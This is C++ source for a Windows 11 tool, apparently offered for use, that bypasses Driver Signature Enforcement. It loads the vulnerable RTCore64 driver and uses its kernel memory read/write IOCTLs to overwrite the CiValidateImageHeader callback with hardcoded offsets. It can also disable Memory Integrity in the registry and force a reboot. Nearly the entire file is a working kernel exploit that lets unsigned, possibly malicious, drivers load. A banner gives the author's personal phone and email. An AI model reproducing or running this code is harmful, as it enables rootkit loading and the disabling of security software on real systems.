#include "drvloader.h"
#include <iostream>
#include <psapi.h>
#include <vector>
#include <fstream>
#include <sstream>
#include <winreg.h>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "advapi32.lib")

// RTCore64 IOCTL codes for memory read/write operations
constexpr DWORD RTC_IOCTL_MEMORY_READ = 0x80002048;
constexpr DWORD RTC_IOCTL_MEMORY_WRITE = 0x8000204C;

// Hardcoded offsets for Windows 11 25H2 - obtained from PDB analysis
constexpr uint64_t OFFSET_SECICALLBACKS = 0xF04780;
constexpr uint64_t OFFSET_ZWFLUSHINSTRUCTIONCACHE = 0x69BFD0;

// RTCore64 driver communication structures
struct alignas(8) RTC_MEMORY_READ {
    BYTE Pad0[8];
    uint64_t Address;
    BYTE Pad1[8];
    uint32_t Size;
    uint32_t Value;
    BYTE Pad3[16];
};

struct alignas(8) RTC_MEMORY_WRITE {
    BYTE Pad0[8];
    uint64_t Address;
    BYTE Pad1[8];
    uint32_t Size;
    uint32_t Value;
    BYTE Pad3[16];
};

void DisplayBanner() {
    std::wcout << L"\n";
    std::wcout << L"+----------------------------------------------------------+\n";
    std::wcout << L"|  Author Marek Wesolowski - WESMAR 2025                   |\n";
    std::wcout << L"|  marek@wesolowski.eu.org                                 |\n";
    std::wcout << L"|  https://kvc.pl                                          |\n";
    std::wcout << L"|  WhatsApp: +48 607 440 283                               |\n";
    std::wcout << L"+----------------------------------------------------------+\n";
    std::wcout << L"\n";
}

bool CheckAndDisableMemoryIntegrity() {
    HKEY hKey;
    LSTATUS result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, 
        L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity",
        0, KEY_READ | KEY_WRITE, &hKey);
    
    if (result != ERROR_SUCCESS) {
        return true; // Key doesn't exist, Memory Integrity not enabled
    }
    
    DWORD enabled = 0;
    DWORD dataSize = sizeof(DWORD);
    result = RegQueryValueExW(hKey, L"Enabled", nullptr, nullptr, (LPBYTE)&enabled, &dataSize);
    
    if (result == ERROR_SUCCESS && enabled == 1) {
        std::wcout << L"[!] WARNING: Memory Integrity (Hypervisor Enforced Code Integrity) is enabled!\n";
        std::wcout << L"[!] DSE patching will succeed, but loading unsigned drivers will cause BSOD.\n";
        std::wcout << L"[!] Do you want to disable Memory Integrity and reboot? (Y/N): ";
        
        wchar_t choice;
        std::wcin >> choice;
        
        if (choice == L'Y' || choice == L'y') {
            // Disable Memory Integrity
            enabled = 0;
            RegSetValueExW(hKey, L"Enabled", 0, REG_DWORD, (const BYTE*)&enabled, sizeof(enabled));
            
            // Remove WasEnabledBy to prevent auto-reenable
            RegDeleteValueW(hKey, L"WasEnabledBy");
            
            std::wcout << L"[+] Memory Integrity disabled. System will reboot to apply changes.\n";
            std::wcout << L"[+] Press any key to continue with reboot...";
            std::wcin.ignore();
            std::wcin.get();
            
            // Initiate system reboot
            HANDLE hToken;
            TOKEN_PRIVILEGES tkp;
            
            if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
                LookupPrivilegeValueW(nullptr, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
                tkp.PrivilegeCount = 1;
                tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                
                AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, nullptr, 0);
                CloseHandle(hToken);
            }
            
            WCHAR rebootMsg[] = L"Memory Integrity disabled for DSE bypass";
			InitiateSystemShutdownExW(nullptr, rebootMsg, 0, TRUE, TRUE, SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER);
            ExitProcess(0);
        } else {
            std::wcout << L"[!] Memory Integrity remains enabled. DSE bypass may cause BSOD on driver load.\n";
            std::wcout << L"[!] Continuing at your own risk...\n\n";
        }
    }
    
    RegCloseKey(hKey);
    return true;
}

std::wstring GetStateFilePath() {
    WCHAR systemRoot[MAX_PATH];
    DWORD len = GetEnvironmentVariableW(L"SystemRoot", systemRoot, MAX_PATH);
    if (len == 0 || len >= MAX_PATH) {
        GetWindowsDirectoryW(systemRoot, MAX_PATH);
    }
    return std::wstring(systemRoot) + L"\\dse_original.ini";
}

std::wstring GetDriverPath() {
    WCHAR systemRoot[MAX_PATH];
    DWORD len = GetEnvironmentVariableW(L"SystemRoot", systemRoot, MAX_PATH);
    if (len == 0 || len >= MAX_PATH) {
        GetWindowsDirectoryW(systemRoot, MAX_PATH);
    }
    return std::wstring(systemRoot) + L"\\System32\\drivers\\RTCore64.sys";
}

bool DrvLoader::CheckDriverFileExists() {
    std::wstring driverPath = GetDriverPath();
    DWORD fileAttrib = GetFileAttributesW(driverPath.c_str());
    
    if (fileAttrib == INVALID_FILE_ATTRIBUTES) {
        std::wcout << L"[-] RTCore64.sys not found in System32\\drivers\n";
        std::wcout << L"[-] Please place the driver file in: " << driverPath << L"\n";
        return false;
    }
    
    std::wcout << L"[+] Driver file found: " << driverPath << L"\n";
    return true;
}

bool DrvLoader::StopAndRemoveDriver() {
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        std::wcout << L"[-] Failed to open Service Control Manager (error: " << GetLastError() << L")\n";
        return false;
    }
    
    SC_HANDLE hService = OpenServiceW(hSCM, L"RTCore64", SERVICE_ALL_ACCESS);
    if (hService) {
        // Service exists - stop it first
        SERVICE_STATUS serviceStatus;
        if (ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus)) {
            std::wcout << L"[+] RTCore64 driver stopped\n";
            Sleep(500);
        } else {
            DWORD err = GetLastError();
            if (err != ERROR_SERVICE_NOT_ACTIVE) {
                std::wcout << L"[!] Warning: Failed to stop driver (error: " << err << L")\n";
            }
        }
        
        // Delete the service
        if (DeleteService(hService)) {
            std::wcout << L"[+] RTCore64 service deleted from registry\n";
        } else {
            std::wcout << L"[-] Failed to delete service (error: " << GetLastError() << L")\n";
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return false;
        }
        
        CloseServiceHandle(hService);
    }
    
    CloseServiceHandle(hSCM);
    return true;
}

bool DrvLoader::InstallAndStartDriver() {
    if (!CheckDriverFileExists()) {
        return false;
    }
    
    StopAndRemoveDriver();
    Sleep(1000);
    
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        std::wcout << L"[-] Failed to open Service Control Manager (error: " << GetLastError() << L")\n";
        return false;
    }
    
    std::wstring driverPath = L"System32\\drivers\\RTCore64.sys";
    
    SC_HANDLE hService = CreateServiceW(
        hSCM,
        L"RTCore64",
        L"RTCore64",
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_SYSTEM_START,
        SERVICE_ERROR_NORMAL,
        driverPath.c_str(),
        nullptr, nullptr, nullptr, nullptr, nullptr
    );
    
    if (!hService) {
        DWORD err = GetLastError();
        std::wcout << L"[-] Failed to create RTCore64 service (error: " << err << L")\n";
        CloseServiceHandle(hSCM);
        return false;
    }
    
    std::wcout << L"[+] RTCore64 service created successfully\n";
    
    if (!StartServiceW(hService, 0, nullptr)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            std::wcout << L"[-] Failed to start RTCore64 driver (error: " << err << L")\n";
            DeleteService(hService);
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return false;
        }
    }
    
    std::wcout << L"[+] RTCore64 driver started successfully\n";
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    
    Sleep(500);
    return true;
}

bool DrvLoader::SaveOriginalCallback(uint64_t callback) {
    std::wstring filePath = GetStateFilePath();
    std::wofstream file(filePath);
    if (!file.is_open()) {
        std::wcout << L"[-] Failed to create state file: " << filePath << L"\n";
        return false;
    }
    
    file << L"[DSE_STATE]\n";
    file << L"OriginalCallback=0x" << std::hex << callback << std::dec << L"\n";
    file.close();
    
    std::wcout << L"[+] Original callback saved to: " << filePath << L"\n";
    return true;
}

std::optional<uint64_t> DrvLoader::LoadOriginalCallback() {
    std::wstring filePath = GetStateFilePath();
    std::wifstream file(filePath);
    if (!file.is_open()) {
        return std::nullopt;
    }
    
    std::wstring line;
    while (std::getline(file, line)) {
        if (line.find(L"OriginalCallback=") != std::wstring::npos) {
            size_t pos = line.find(L"0x");
            if (pos != std::wstring::npos) {
                std::wstring hexValue = line.substr(pos + 2);
                uint64_t callback = std::stoull(hexValue, nullptr, 16);
                file.close();
                std::wcout << L"[+] Loaded original callback from: " << filePath << L"\n";
                std::wcout << L"[+] Original callback: 0x" << std::hex << callback << std::dec << L"\n";
                return callback;
            }
        }
    }
    
    file.close();
    return std::nullopt;
}

bool DrvLoader::DeleteStateFile() {
    std::wstring filePath = GetStateFilePath();
    if (DeleteFileW(filePath.c_str())) {
        std::wcout << L"[+] State file deleted: " << filePath << L"\n";
        return true;
    }
    return false;
}

bool DrvLoader::Initialize() {
    originalCallback = LoadOriginalCallback();
    return true;
}

void DrvLoader::Cleanup() {
    if (hDriver != INVALID_HANDLE_VALUE) {
        CloseHandle(hDriver);
        hDriver = INVALID_HANDLE_VALUE;
    }
}

bool DrvLoader::WriteMemory32(uint64_t address, uint32_t value) {
    if (hDriver == INVALID_HANDLE_VALUE) return false;
    
    RTC_MEMORY_WRITE writePacket{};
    writePacket.Address = address;
    writePacket.Size = sizeof(uint32_t);
    writePacket.Value = value;
    
    DWORD bytesReturned = 0;
    return DeviceIoControl(hDriver, RTC_IOCTL_MEMORY_WRITE, &writePacket, sizeof(writePacket), 
                          &writePacket, sizeof(writePacket), &bytesReturned, nullptr);
}

bool DrvLoader::WriteMemory64(uint64_t address, uint64_t value) {
    return WriteMemory32(address, static_cast<uint32_t>(value & 0xFFFFFFFF)) && 
           WriteMemory32(address + 4, static_cast<uint32_t>((value >> 32) & 0xFFFFFFFF));
}

std::optional<uint32_t> DrvLoader::ReadMemory32(uint64_t address) {
    if (hDriver == INVALID_HANDLE_VALUE) return std::nullopt;
    
    RTC_MEMORY_READ readPacket{};
    readPacket.Address = address;
    readPacket.Size = sizeof(uint32_t);
    
    DWORD bytesReturned = 0;
    if (!DeviceIoControl(hDriver, RTC_IOCTL_MEMORY_READ, &readPacket, sizeof(readPacket), 
                        &readPacket, sizeof(readPacket), &bytesReturned, nullptr))
        return std::nullopt;
    
    return readPacket.Value;
}

std::optional<uint64_t> DrvLoader::ReadMemory64(uint64_t address) {
    auto low = ReadMemory32(address);
    auto high = ReadMemory32(address + 4);
    if (!low || !high) return std::nullopt;
    
    return (static_cast<uint64_t>(*high) << 32) | *low;
}

std::optional<uint64_t> DrvLoader::GetNtoskrnlBase() {
    std::vector<LPVOID> drivers(1024);
    DWORD needed = 0;
    
    if (!EnumDeviceDrivers(drivers.data(), static_cast<DWORD>(drivers.size() * sizeof(LPVOID)), &needed))
        return std::nullopt;
    
    drivers.resize(needed / sizeof(LPVOID));
    
    for (const auto& driver : drivers) {
        WCHAR driverName[MAX_PATH];
        if (GetDeviceDriverBaseNameW(driver, driverName, MAX_PATH) && wcscmp(driverName, L"ntoskrnl.exe") == 0) {
            uint64_t base = reinterpret_cast<uint64_t>(driver);
            std::wcout << L"[+] ntoskrnl.exe base: 0x" << std::hex << base << std::dec << L"\n";
            return base;
        }
    }
    
    return std::nullopt;
}

bool DrvLoader::CheckDSEStatus(bool& isPatched) {
    std::wcout << L"\n[=== Checking DSE Status ===]\n\n";
    
    if (!InstallAndStartDriver()) {
        return false;
    }
    
    hDriver = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDriver == INVALID_HANDLE_VALUE) {
        std::wcout << L"[-] Failed to open RTCore64 driver\n";
        StopAndRemoveDriver();
        return false;
    }
    std::wcout << L"[+] RTCore64 driver opened successfully\n";
    
    auto ntBase = GetNtoskrnlBase();
    if (!ntBase) {
        std::wcout << L"[-] Failed to locate ntoskrnl.exe\n";
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    uint64_t seCiCallbacks = *ntBase + OFFSET_SECICALLBACKS;
    uint64_t safeFunction = *ntBase + OFFSET_ZWFLUSHINSTRUCTIONCACHE;
    uint64_t callbackAddress = seCiCallbacks + 0x20;
    
    auto currentCallback = ReadMemory64(callbackAddress);
    if (!currentCallback) {
        std::wcout << L"[-] Failed to read callback address\n";
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    isPatched = (*currentCallback == safeFunction);
    
    std::wcout << L"[+] Current CiValidateImageHeader: 0x" << std::hex << *currentCallback << std::dec << L"\n";
    std::wcout << L"[+] Safe function address: 0x" << std::hex << safeFunction << std::dec << L"\n";
    std::wcout << L"[+] DSE Status: " << (isPatched ? L"PATCHED (disabled)" : L"ACTIVE (enabled)") << L"\n";
    
    Cleanup();
    StopAndRemoveDriver();
    
    return true;
}

bool DrvLoader::BypassDSE() {
    std::wcout << L"\n[=== DSE Bypass - Single Callback Patch ===]\n\n";
    
    std::wcout << L"[1/5] Installing and starting RTCore64 driver...\n";
    if (!InstallAndStartDriver()) {
        return false;
    }
    
    hDriver = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDriver == INVALID_HANDLE_VALUE) {
        std::wcout << L"[-] Failed to open RTCore64 driver\n";
        StopAndRemoveDriver();
        return false;
    }
    std::wcout << L"[+] RTCore64 driver opened successfully\n";
    
    std::wcout << L"[2/5] Locating ntoskrnl.exe in kernel memory...\n";
    auto ntBase = GetNtoskrnlBase();
    if (!ntBase) {
        std::wcout << L"[-] Failed to locate ntoskrnl.exe\n";
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    std::wcout << L"[3/5] Calculating target addresses using PDB offsets...\n";
    uint64_t seCiCallbacks = *ntBase + OFFSET_SECICALLBACKS;
    uint64_t safeFunction = *ntBase + OFFSET_ZWFLUSHINSTRUCTIONCACHE;
    
    std::wcout << L"[+] SeCiCallbacks table located at: 0x" << std::hex << seCiCallbacks << std::dec << L"\n";
    std::wcout << L"[+] Safe function (ZwFlushInstructionCache) at: 0x" << std::hex << safeFunction << std::dec << L"\n";
    
    std::wcout << L"[4/5] Patching CiValidateImageHeader callback...\n";
    
    uint64_t callbackToPatch = seCiCallbacks + 0x20;
    
    auto currentCallback = ReadMemory64(callbackToPatch);
    if (!currentCallback) {
        std::wcout << L"[-] Failed to read current callback address\n";
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    if (*currentCallback == safeFunction) {
        std::wcout << L"[!] Callback already patched - no changes needed\n";
        Cleanup();
        StopAndRemoveDriver();
        return true;
    }
    
    originalCallback = *currentCallback;
    std::wcout << L"[*] Original CiValidateImageHeader: 0x" << std::hex << *currentCallback << std::dec << L"\n";
    
    if (!SaveOriginalCallback(*originalCallback)) {
        std::wcout << L"[!] Warning: Failed to save original callback to file\n";
    }
    
    std::wcout << L"[*] Replacing with safe function: 0x" << std::hex << safeFunction << std::dec << L"\n";
    
    if (!WriteMemory64(callbackToPatch, safeFunction)) {
        std::wcout << L"[-] Failed to write new callback address\n";
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    auto newCallback = ReadMemory64(callbackToPatch);
    if (!newCallback || *newCallback != safeFunction) {
        std::wcout << L"[-] Patch verification failed - memory write unsuccessful\n";
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    std::wcout << L"[+] DSE bypass completed successfully!\n";
    std::wcout << L"[+] CiValidateImageHeader has been replaced with ZwFlushInstructionCache\n";
    std::wcout << L"[+] Unsigned drivers can now be loaded\n";
    
    std::wcout << L"[5/5] Cleaning up - stopping and removing driver...\n";
    Cleanup();
    StopAndRemoveDriver();
    
    std::wcout << L"[+] System cleanup completed - no driver instances running\n";
    
    return true;
}

bool DrvLoader::RestoreDSE() {
    std::wcout << L"\n[=== DSE Restore - Reverting Callback Patch ===]\n\n";
    
    if (!originalCallback) {
        std::wcout << L"[-] No original callback in memory or state file\n";
        std::wcout << L"[!] Cannot restore - original address unknown\n";
        return false;
    }
    
    std::wcout << L"[1/5] Installing and starting RTCore64 driver...\n";
    if (!InstallAndStartDriver()) {
        return false;
    }
    
    hDriver = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDriver == INVALID_HANDLE_VALUE) {
        std::wcout << L"[-] Failed to open RTCore64 driver\n";
        StopAndRemoveDriver();
        return false;
    }
    std::wcout << L"[+] RTCore64 driver opened successfully\n";
    
    std::wcout << L"[2/5] Locating ntoskrnl.exe in kernel memory...\n";
    auto ntBase = GetNtoskrnlBase();
    if (!ntBase) {
        std::wcout << L"[-] Failed to locate ntoskrnl.exe\n";
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    std::wcout << L"[3/5] Calculating target addresses...\n";
    uint64_t seCiCallbacks = *ntBase + OFFSET_SECICALLBACKS;
    uint64_t safeFunction = *ntBase + OFFSET_ZWFLUSHINSTRUCTIONCACHE;
    uint64_t callbackAddress = seCiCallbacks + 0x20;
    
    std::wcout << L"[+] SeCiCallbacks table located at: 0x" << std::hex << seCiCallbacks << std::dec << L"\n";
    std::wcout << L"[+] Original callback to restore: 0x" << std::hex << *originalCallback << std::dec << L"\n";
    
    std::wcout << L"[4/5] Restoring original CiValidateImageHeader callback...\n";
    
    auto currentCallback = ReadMemory64(callbackAddress);
    if (!currentCallback) {
        std::wcout << L"[-] Failed to read current callback address\n";
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    if (*currentCallback == *originalCallback) {
        std::wcout << L"[!] Callback already restored - no changes needed\n";
        DeleteStateFile();
        Cleanup();
        StopAndRemoveDriver();
        return true;
    }
    
    if (*currentCallback != safeFunction) {
        std::wcout << L"[!] Warning: Current callback doesn't match expected patched state\n";
        std::wcout << L"[*] Current: 0x" << std::hex << *currentCallback << std::dec << L"\n";
        std::wcout << L"[*] Expected: 0x" << std::hex << safeFunction << std::dec << L"\n";
    }
    
    std::wcout << L"[*] Current callback: 0x" << std::hex << *currentCallback << std::dec << L"\n";
    std::wcout << L"[*] Restoring to: 0x" << std::hex << *originalCallback << std::dec << L"\n";
    
    if (!WriteMemory64(callbackAddress, *originalCallback)) {
        std::wcout << L"[-] Failed to write original callback address\n";
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    auto restoredCallback = ReadMemory64(callbackAddress);
    if (!restoredCallback || *restoredCallback != *originalCallback) {
        std::wcout << L"[-] Restoration verification failed - memory write unsuccessful\n";
        Cleanup();
        StopAndRemoveDriver();
        return false;
    }
    
    std::wcout << L"[+] DSE restore completed successfully!\n";
    std::wcout << L"[+] CiValidateImageHeader has been restored to original address\n";
    std::wcout << L"[+] Driver signature enforcement is now active\n";
    
    DeleteStateFile();
    
    std::wcout << L"[5/5] Cleaning up - stopping and removing driver...\n";
    Cleanup();
    StopAndRemoveDriver();
    
    std::wcout << L"[+] System cleanup completed - no driver instances running\n";
    
    return true;
}

void DisplayMenu(bool isPatched) {
    std::wcout << L"\n";
    std::wcout << L"=========================================================\n";
    std::wcout << L"                    AVAILABLE OPERATIONS\n";
    std::wcout << L"=========================================================\n";
    
    if (isPatched) {
        std::wcout << L"[1] Restore DSE (re-enable driver signature enforcement)\n";
    } else {
        std::wcout << L"[1] Patch DSE (disable driver signature enforcement)\n";
    }
    
    std::wcout << L"[2] Exit\n";
    std::wcout << L"=========================================================\n";
    std::wcout << L"\nSelect option: ";
}

int main() {
    DisplayBanner();
    
    // Check Memory Integrity status first
    if (!CheckAndDisableMemoryIntegrity()) {
        std::wcout << L"[-] Failed to check Memory Integrity status\n";
        return 1;
    }
    
    std::wcout << L"DSE Bypass Tool - Windows 11 25H2\n";
    std::wcout << L"=========================================================\n";
    std::wcout << L"Technique: SeCiCallbacks CiValidateImageHeader replacement\n";
    std::wcout << L"Vulnerable driver: RTCore64\n";
    
    DrvLoader loader;
    
    if (!loader.Initialize()) {
        std::wcout << L"\n[FAILED] Could not initialize loader\n";
        return 1;
    }
    
    bool isPatched = false;
    if (!loader.CheckDSEStatus(isPatched)) {
        std::wcout << L"\n[FAILED] Could not determine DSE status\n";
        return 1;
    }
    
    DisplayMenu(isPatched);
    
    int choice = 0;
    std::wcin >> choice;
    
    bool success = false;
    
    if (choice == 1) {
        if (isPatched) {
            success = loader.RestoreDSE();
            if (success) {
                std::wcout << L"\n[SUCCESS] DSE has been restored. Driver signature enforcement is active.\n";
            } else {
                std::wcout << L"\n[FAILED] DSE restoration was unsuccessful.\n";
            }
        } else {
            success = loader.BypassDSE();
            if (success) {
                std::wcout << L"\n[SUCCESS] DSE has been bypassed. You can now load unsigned drivers.\n";
            } else {
                std::wcout << L"\n[FAILED] DSE bypass was unsuccessful.\n";
            }
        }
    } else if (choice == 2) {
        std::wcout << L"\nExiting without changes.\n";
        success = true;
    } else {
        std::wcout << L"\n[ERROR] Invalid option selected.\n";
    }
    
    return success ? 0 : 1;
}